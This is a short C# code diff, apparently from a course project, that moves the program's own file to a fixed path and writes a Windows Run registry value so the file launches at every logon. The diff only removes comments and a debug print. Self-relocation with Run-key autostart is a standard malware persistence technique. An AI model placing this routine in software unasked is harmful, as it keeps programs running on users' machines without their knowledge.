@@ -33,30 +33,18 @@ namespace gigas{
                 // moves file to set location
                 File.Move(currentname, path);
             }
-
             
-            // creates new registry key
             RegistryKey szRunKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
             
-            Console.WriteLine(szRunKey);
-            
-            // writes new key
             if (szRunKey != null)
             {
-                
-        
                 if(!same)   
                 {
-                
                     Console.WriteLine("writing new key");
                     szRunKey.CreateSubKey("CSC432",RegistryKeyPermissionCheck.ReadWriteSubTree);
                     szRunKey.SetValue("StringValue",path);
-                    
-                    
-
                 }
                 szRunKey.Close();    
-            
             } 
             
             else{Console.WriteLine("Registry Key Not Found.");}
